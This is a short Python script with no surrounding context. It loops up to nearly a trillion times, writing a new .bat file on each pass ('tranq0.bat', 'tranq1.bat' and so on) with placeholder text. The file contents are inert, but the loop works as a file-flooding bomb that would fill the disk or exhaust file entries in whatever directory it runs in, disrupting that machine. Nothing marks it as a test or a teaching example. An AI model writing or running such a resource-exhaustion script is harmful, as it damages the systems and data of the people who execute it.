#START
RANGE = 999999999999
TEXT = "WHATTTTTTTTT"
NAME = "tranq"
TYPE = ".bat"
End = RANGE - 1
for x in range(0, RANGE):
    FINAL = NAME + str(x) + TYPE
    f = open(FINAL, "x")
    f.write(TEXT + '\n')
    f.close()
#END